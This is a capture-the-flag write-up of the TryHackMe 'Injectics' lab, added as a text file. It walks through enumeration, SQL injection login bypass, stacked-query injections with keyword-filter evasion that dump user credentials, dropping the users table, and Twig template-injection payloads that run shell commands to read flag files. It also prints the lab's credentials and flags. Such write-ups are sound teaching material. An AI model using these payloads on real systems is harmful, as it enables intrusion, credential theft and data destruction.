@@ -1,0 +1,242 @@
+#####################Tryhackme Injectic room##############################
+Link: https://tryhackme.com/r/room/injectics
+Level: Medium
+Date: 28-01-2025
+ip: 10.10.59.33
+
+
+##enumeration------------------------
+To start we will do a port scann to find open ports.
+$rustscan -a 10.10.59.33 -- -A -sV -sC -O -Pn 
+	22 --> SSH
+	80 --> HTTP Apache/2.4.41
+
+##PORT 80 enumeration
+We will do directory enumeration to see if we can found something interesting before continue 
+$gobuster dir -u http://10.10.59.33/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x .php
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.59.33/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.php            (Status: 200) [Size: 6588]
+/login.php            (Status: 200) [Size: 5401]
+/.php                 (Status: 403) [Size: 276]
+/flags                (Status: 301) [Size: 310] [--> http://10.10.59.33/flags/]
+/css                  (Status: 301) [Size: 308] [--> http://10.10.59.33/css/]
+/js                   (Status: 301) [Size: 307] [--> http://10.10.59.33/js/]
+/javascript           (Status: 301) [Size: 315] [--> http://10.10.59.33/javascript/]
+/logout.php           (Status: 302) [Size: 0] [--> index.php]
+/vendor               (Status: 301) [Size: 311] [--> http://10.10.59.33/vendor/]
+/dashboard.php        (Status: 302) [Size: 0] [--> dashboard.php]
+/functions.php        (Status: 200) [Size: 0]
+/phpmyadmin           (Status: 301) [Size: 315] [--> http://10.10.59.33/phpmyadmin/]
+/.php                 (Status: 403) [Size: 276]
+/conn.php             (Status: 200) [Size: 0]
+/server-status        (Status: 403) [Size: 276]
+
+
+#-----------------------------------------------------------------------------------
+
+After a few moment searching on the websie, i found 2 login pages. I will add the burpsuite interception of these two pages
+
+http://10.10.59.33/login.php  --> simple login page
+
+POST /functions.php HTTP/1.1
+Host: 10.10.59.33
+Content-Length: 55
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-US,en;q=0.9
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+Origin: http://10.10.59.33
+Referer: http://10.10.59.33/login.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=7jram30t0cr0rjqq594ve0suai
+Connection: keep-alive
+
+username=lala%40email.thm&password=passs&function=login
+
+
+#--------------------------------------------------------------------------------
+
+http://10.10.59.33/adminLogin007.php  --> Admin login page
+
+POST /adminLogin007.php HTTP/1.1
+Host: 10.10.59.33
+Content-Length: 31
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://10.10.59.33
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.59.33/adminLogin007.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=7jram30t0cr0rjqq594ve0suai
+Connection: keep-alive
+
+mail=lala%40email.thm&pass=pass
+
+
+
+As the first question or thr flag is on thr admin page i will try some methods to login to admin pannel. I will start with SQL injection.
+
+#Automated SQL injection
+I try with sqlmap but nothing
+
+$sqlmap -r injects.sql --dbs 
+
+$sqlmap -r injects.sql --dbs --risk=3 --level=5 --batch --tamper=space2comment
+
+
+#Let me test manual SQL inhection
+' OR '1'='1' --  
+admin' --  
+' UNION SELECT 1,2,3,4,5 --  
+
+
+Bingo when i put a ' character on the login.php username imput i recieve a message : Invalid keywords detected
+
+So i thing i will bypass it with url encoding to see. it gives %27 and when i put it there they don't show me the pop up again.
+
+Let continue.
+
+
+I finnaly use sql-login-bypass.md file to see all payload possible and i start choosing someones. i found someone which works : ' OR 'x'='x'#;
+Link if the file: https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/login-bypass/sql-login-bypass.md
+
+
+Payload: ' OR 'x'='x'#;
+
+I replace it on the burpsuite answer because i can't do it on the web page. After replacing it there, i foware the request and bingo i access to the dashboard page.
+Link: http://10.10.59.33/dashboard.php
+
+POST /functions.php HTTP/1.1
+Host: 10.10.59.33
+Content-Length: 56
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-US,en;q=0.9
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+Origin: http://10.10.59.33
+Referer: http://10.10.59.33/login.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=7jram30t0cr0rjqq594ve0suai
+Connection: keep-alive
+
+username=' OR 'x'='x'#;&password=password&function=login
+
+
+
+You can use a automates method to do it using ffuf
+$ffuf -w sql-login-bypass.md -X POST -u http://10.10.59.33/functions.php -d 'username=FUZZ&password=asdf&function=login' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -fr 'num_rows' -fw 4
+
+
+#-----------------------------------------------------------------------
+Now we are logged in but we are not admin. The nextstep is to become admin.
+
+To start we can't modify data but i noticed something after multiples tentatives that i can use commands concatenation 
+
+9;UPDATE leaderboard SET country='0xb0b' where country='USA';
+
+1337;UPDATE leaderboard SET country=@@version where country='0xb0b';
+
+1;UPDATE leaderboard SET country=concat(DATABASE()) where country='8.0.37-0ubuntu0.20.04.3';
+
+1;UPDATE leaderboard SET country=concat((SELECT group_concat(table_name)FROM information_schema.tables WHERE table_schema=database())) where country='bac_test';
+
+1;UPDATE leaderboard SET country='Korea' where country='bac_test';
+
+1;UPDATE leaderboard SET country=concat('SELECT',' ','FROM',' ','OR',' ','information_schema',' ');
+
+1;UPDATE leaderboard SET country=concat('SSELECTELECT',' ','OORR');
+
+1;UPDATE leaderboard SET country=concat((SSELECTELECT group_concat(table_name)FROM infoorrmation_schema.tables WHERE table_schema=database()));
+
+1;UPDATE leaderboard SET country=concat((SSELECTELECT group_concat(column_name) FROM infoorrmation_schema.columns WHERE table_name='users'));
+
+1;UPDATE leaderboard SET country=concat((SSELECTELECT group_concat(email,passwoorrd) FROM users));
+
+
+After that we got passwords and usernames.
+
+dev@injectics.thm : 2342sdsfwf2wr2rf
+superadmin@injectics.thm : 34234vsdfwr2r2wf2r2
+
+We will now login as admin.
+
+Admin flag: THM{INJECTICS_ADMIN_PANEL_007}
+
+
+
+After that i try again a gobuster with .log extension and i found mail.log file, see his containing.
+
+From: dev@injectics.thm
+To: superadmin@injectics.thm
+Subject: Update before holidays
+
+Hey,
+
+Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.
+
+To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.
+
+Here are the default credentials that will be added:
+
+| Email                     | Password 	              |
+|---------------------------|-------------------------|
+| superadmin@injectics.thm  | superSecurePasswd101    |
+| dev@injectics.thm         | devPasswd123            |
+
+Please let me know if there are any further updates or changes needed.
+
+Best regards,
+Dev Team
+
+dev@injectics.thm
+
+
+so the thing i have to do is to drop users table to use default credentials.
+
+1.DROP TABLES users;
+
+
+Cool it is done now i can login with default credentials
+
+After that i thinks that the modificaton of profile will be the entry door. Let me try somethings.
+I try SSTI injection with {{7*7}} it works but when i replace by id it don't work. Go to gpt to have a answer.
+
+when i try {{request|attr("args")}} i have n eror message : 
+Err_msg: Unknown "attr" filter in "__string_template__15ab09c5ed1bf2d8bc9dfc9927cbd228c2cd65d44dc4b98764d1fb453b2f9a47" at line 1.
+
+Chat gpt give us this : {{['id','']|sort('passthru')}}
+Answer: Welcome, uid=33(www-data) gid=33(www-data) groups=33(www-data) Array!
+
+
+now we will tryo read files in /flags file.
+
+i try : {{['ls flags','']|sort('passthru')}}
+Answer: Welcome, 5d8af1dc14503c7e4bdc8e51a3469f48.txt Array!
+
+
+now we just have to read the file.
+
+{{['cat flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt','']|sort('passthru')}}
+Welcome, THM{5735172b6c147f4dd649872f73e0fdea} Array!
+
+
+Thank you for reading my opinion of the room @petstar from togo
